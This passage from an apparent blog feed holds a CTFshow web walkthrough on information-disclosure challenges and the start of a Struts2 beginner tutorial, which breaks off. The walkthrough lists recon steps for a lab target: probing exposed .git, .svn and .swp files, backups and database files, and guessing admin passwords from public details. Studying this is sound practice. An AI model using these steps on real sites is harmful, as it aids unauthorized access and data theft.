    <content type="html"><![CDATA[<p>CTFshow靶场 Web入门系列</p> <a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h3 id="考点-源码泄露"><a href="#考点-源码泄露" class="headerlink" title="考点: 源码泄露"></a>考点: 源码泄露</h3><blockquote><p>题目描述：开发注释未及时删除</p></blockquote><p>查看源代码，得到flag</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="考点-前台JS绕过"><a href="#考点-前台JS绕过" class="headerlink" title="考点: 前台JS绕过"></a>考点: 前台JS绕过</h3><blockquote><p>题目描述:js前台拦截 === 无效操作</p></blockquote><p>查看源码方法很多<br>1.禁用JS,再查看源代码；<br>2.在网址前加上<code>view-source:</code>即可查看源代码<br>3.ctrl+u查看源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-built_in">window</span>.oncontextmenu = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;  <br><span class="hljs-comment">//禁用鼠标右键</span><br><span class="hljs-built_in">window</span>.onselectstart = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;<br><span class="hljs-comment">//禁用页面选择</span><br><span class="hljs-built_in">window</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (event.keyCode==<span class="hljs-number">123</span>)&#123;event.keyCode=<span class="hljs-number">0</span>;event.returnValue=<span class="hljs-literal">false</span>;&#125;&#125;;<br>&lt;/script&gt;<br>   <span class="hljs-comment">//禁用F12键</span><br></code></pre></td></tr></table></figure><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><h3 id="考点-协议头信息泄露"><a href="#考点-协议头信息泄露" class="headerlink" title="考点: 协议头信息泄露"></a>考点: 协议头信息泄露</h3><blockquote><p>题目描述：没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>抓包，查看响应头，即可得到flag</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><h3 id="考点-robots后台泄露"><a href="#考点-robots后台泄露" class="headerlink" title="考点: robots后台泄露"></a>考点: robots后台泄露</h3><blockquote><p>题目描述：总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>访问robots.txt，得到flagishere.txt信息，访问即可</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><h3 id="考点-phps源码泄露"><a href="#考点-phps源码泄露" class="headerlink" title="考点: phps源码泄露"></a>考点: phps源码泄露</h3><blockquote><p>题目描述：phps源码泄露有时候能帮上忙</p></blockquote><p>访问index.phps下载备份文件</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><h3 id="考点-源码压缩包泄露"><a href="#考点-源码压缩包泄露" class="headerlink" title="考点: 源码压缩包泄露"></a>考点: 源码压缩包泄露</h3><blockquote><p>题目描述：解压源码到当前目录，测试正常，收工</p></blockquote><p>访问<a href="http://www.zip下载源码,解压得到fl000g.txt,里面的是假flag,需要访问才会得到真flag/">www.zip下载源码，解压得到fl000g.txt，里面的是假flag，需要访问才会得到真flag</a></p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><h3 id="考点-Git泄露"><a href="#考点-Git泄露" class="headerlink" title="考点: Git泄露"></a>考点: Git泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问目录url/.git/</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><h3 id="考点-SVN泄露"><a href="#考点-SVN泄露" class="headerlink" title="考点: SVN泄露"></a>考点: SVN泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问url/.svn即可</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><h3 id="考点-vim临时文件泄露"><a href="#考点-vim临时文件泄露" class="headerlink" title="考点: vim临时文件泄露"></a>考点: vim临时文件泄露</h3><blockquote><p>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>提示在使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问url/index.php.swp下载备份文件</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><h3 id="考点-cookie泄露"><a href="#考点-cookie泄露" class="headerlink" title="考点: cookie泄露"></a>考点: cookie泄露</h3><blockquote><p>题目描述：cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>抓包查看cookie发现flag</p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><h3 id="考点-域名txt记录泄露"><a href="#考点-域名txt记录泄露" class="headerlink" title="考点: 域名txt记录泄露"></a>考点: 域名txt记录泄露</h3><blockquote><p>题目描述：域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p></blockquote><p>在线DNS域名解析，即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://whois.chinaz.com/<br>http://www.jsons.cn/nslookup/<br>https://zijian.aliyun.com/<br></code></pre></td></tr></table></figure><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><h3 id="考点-敏感信息公布"><a href="#考点-敏感信息公布" class="headerlink" title="考点: 敏感信息公布"></a>考点: 敏感信息公布</h3><blockquote><p>题目描述：有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问后台地址admin，管理员账号admin，在网页底找到了电话号码，猜测是密码</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><h3 id="考点-内部技术文档泄露"><a href="#考点-内部技术文档泄露" class="headerlink" title="考点: 内部技术文档泄露"></a>考点: 内部技术文档泄露</h3><blockquote><p>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>在网页底部找到一个doucument链接。得到后台地址<code>/system1103/login.php</code>和帐号密码</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><h3 id="考点-编辑器配置不当"><a href="#考点-编辑器配置不当" class="headerlink" title="考点: 编辑器配置不当"></a>考点: 编辑器配置不当</h3><blockquote><p>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问url/editor，发现一个网页自带的编辑器,点击上传图片，可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问<code>/nothinghere/fl000g.txt</code>即可得到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><h3 id="考点-密码逻辑脆弱"><a href="#考点-密码逻辑脆弱" class="headerlink" title="考点: 密码逻辑脆弱"></a>考点: 密码逻辑脆弱</h3><blockquote><p>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>在底部找到邮箱信息，访问后台地址/admin，用户名admin ，选择忘记密码。查找到邮箱qq所在地为西安，返回修改后的密码，登录即可得到flag。</p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><h3 id="考点-探针泄露"><a href="#考点-探针泄露" class="headerlink" title="考点: 探针泄露"></a>考点: 探针泄露</h3><blockquote><p>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问/tz.php，看下PHP参数,点击phpinfo超链接，在phpinfo页面搜索ctfshow即可</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><h3 id="考点-CDN穿透"><a href="#考点-CDN穿透" class="headerlink" title="考点: CDN穿透"></a>考点: CDN穿透</h3><blockquote><p>题目描述：透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</p></blockquote><p>根据hint提示，直接ping <a href="http://www.ctfshow.com得到ip地址111.231.70.44/">www.ctfshow.com得到IP地址111.231.70.44</a></p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><h3 id="考点-js敏感信息泄露"><a href="#考点-js敏感信息泄露" class="headerlink" title="考点: js敏感信息泄露"></a>考点: js敏感信息泄露</h3><blockquote><p>题目描述：不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>查看源码，发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/Flappy_js.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>访问/js/Flappy_js.js查看Flappy_js.js文件，发现了一段编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(score&gt;<span class="hljs-number">100</span>)<br>&#123;<br><span class="hljs-keyword">var</span> result=<span class="hljs-built_in">window</span>.confirm(<span class="hljs-string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Unicode解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">你赢了，去幺幺零点皮爱吃皮看看<br></code></pre></td></tr></table></figure><p>访问/110.php即可</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><h3 id="考点-前端密钥泄露"><a href="#考点-前端密钥泄露" class="headerlink" title="考点: 前端密钥泄露"></a>考点: 前端密钥泄露</h3><blockquote><p>题目描述：密钥什么的，就不要放在前端了</p></blockquote><p>查看源码，前端含有注释代码，泄露了用户名和密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    error_reporting(0);</span><br><span class="hljs-comment">    $flag=&quot;fakeflag&quot;</span><br><span class="hljs-comment">    $u = $_POST[&#x27;username&#x27;];</span><br><span class="hljs-comment">    $p = $_POST[&#x27;pazzword&#x27;];</span><br><span class="hljs-comment">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="hljs-comment">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="hljs-comment">            echo $flag;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">    --&gt;</span><br></code></pre></td></tr></table></figure><p>输入用户名和密码提示不正确，用Post提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br></code></pre></td></tr></table></figure><h2 id="WEB-20"><a href="#WEB-20" class="headerlink" title="WEB 20"></a>WEB 20</h2><h3 id="考点-数据库恶意下载"><a href="#考点-数据库恶意下载" class="headerlink" title="考点: 数据库恶意下载"></a>考点: 数据库恶意下载</h3><blockquote><p>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>早期asp+access架构的数据库文件为db.mdb，直接查看url路径添加加/db/db.mdb下载文件，用记事本打开搜索flag即可。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
      <tag>CTFshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2框架入门</title>
    <link href="/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
    <url>/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（一）</p> <a id="more"></a><h1 id="Struts2框架入门"><a href="#Struts2框架入门" class="headerlink" title="Struts2框架入门"></a>Struts2框架入门</h1><h2 id="Struts2简介"><a href="#Struts2简介" class="headerlink" title="Struts2简介"></a>Struts2简介</h2><blockquote><p>Struts2是一种基于MVC模式的轻量级Web框架，Struts2是Struts1的下一代产品，是在Struts1和WebWork技术的基础上进行合并后的全新框架</p></blockquote><p>struts2框架其实是对javaWeb表现层的MVC作了优化</p><h2 id="Struts2的优点"><a href="#Struts2的优点" class="headerlink" title="Struts2的优点"></a>Struts2的优点</h2><p>1、项目开源，使用及拓展方便，天生优势。<br>2、提供Exception处理机制。<br>3、Result方式的页面导航，通过Result标签实现页面跳转。4<br>4、通过简单、集中的配置来调度业务类，方便修改。<br>5、提供简单、统一的表达式语言来访问所有可供访问的数据。<br>6、提供标准、强大的验证框架和国际化框架。<br>7、提供强大的、可以有效减少页面代码的标签。<br>8、提供良好的Ajax支持。<br>9、拥有简单的插件，可以扩展Struts2框架。<br>10、拥有智能的默认设置，不需要另外进行繁琐的设置。</p><h2 id="Struts2入门案例"><a href="#Struts2入门案例" class="headerlink" title="Struts2入门案例"></a>Struts2入门案例</h2><h3 id="第一步：下载jar包"><a href="#第一步：下载jar包" class="headerlink" title="第一步：下载jar包"></a>第一步：下载jar包</h3><p>下载地址：<a href="https://struts.apache.org/">https://struts.apache.org/</a></p><p>选择struts-2.3.37-all.zip 下载<br><img src="https://img-blog.csdnimg.cn/20210318221037734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下载解压后，出现以下界面,struts-2.3.37的目录结构：<br><img src="https://img-blog.csdnimg.cn/20210318221245199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>由于struts的jar包并不全部需要，找到apps目录下struts2-blank.war</p><p><img src="https://img-blog.csdnimg.cn/20210318221723429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压struts2-blank.war，将示例程序lib目录下的jar包添加到我们项目中即可，此版本的Struts2项目必需的13个jar包。<br><img src="https://img-blog.csdnimg.cn/20210318221628262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：创建项目导入jar包"><a href="#第二步：创建项目导入jar包" class="headerlink" title="第二步：创建项目导入jar包"></a>第二步：创建项目导入jar包</h3><p>创建项目，将上面的13个jar包粘贴到lib中，然后build path，会在Web App Libraries中看到<br><img src="https://img-blog.csdnimg.cn/20210319193907712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第三步：配置web-xml"><a href="#第三步：配置web-xml" class="headerlink" title="第三步：配置web.xml"></a>第三步：配置web.xml</h3><p>编辑web应用的web.xml配置文件，配置struts2的核心拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee </span></span><br><span class="hljs-tag"><span class="hljs-string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--配置Struts2核心过滤器--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第四步：创建Action类"><a href="#第四步：创建Action类" class="headerlink" title="第四步：创建Action类"></a>第四步：创建Action类</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="第五步：创建struts-xml文件"><a href="#第五步：创建struts-xml文件" class="headerlink" title="第五步：创建struts.xml文件"></a>第五步：创建struts.xml文件</h3><p>引入dtd约束，该代码可以在WebContent\WEB-INF\lib\struts2-core-2.3.37.jar找到<br><img src="https://img-blog.csdnimg.cn/20210319195632426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <span class="hljs-comment">&lt;!-- 配置Action --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 配置result结果页面跳转 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>解决Struts2的配置文件struts.xml文件无提示问题</strong><br>struts.xml文件提示来自DTD约束：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>方法1：电脑可以上网，会自动访问<code>http://struts.apache.org/dtds/struts-2.3.dtd</code>，提供提示功能<br>方法2: 配置本地DTD提示<br>首先需要找到我们的struts核心jar包<code>struts2-core-2.3.30.jar</code>，然后我们需要将它解压，可以看到<code>struts-2.3.dtd</code>文件<br><img src="https://img-blog.csdnimg.cn/2021032319251158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择window  –&gt; preferences  –&gt;  搜索xml  –&gt;  选择xml Catalog<br><img src="https://img-blog.csdnimg.cn/20210323192626738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>  Location：点击File System，添加刚才解压ruts2-2.3.dtd文件路径。</li><li>   Key type ：选择URI</li><li>  key：<a href="http://struts.apache.org/dtds/struts-2.3.dtd">http://struts.apache.org/dtds/struts-2.3.dtd</a><br><img src="https://img-blog.csdnimg.cn/20210323192722238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击应用，重新打开struts.xml编辑，会得到提示<br><img src="https://img-blog.csdnimg.cn/20210323193147877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="第六步：创建jsp文件"><a href="#第六步：创建jsp文件" class="headerlink" title="第六步：创建jsp文件"></a>第六步：创建jsp文件</h3><p>index.jsp</p><figure class="highlight html"><table><tr><td 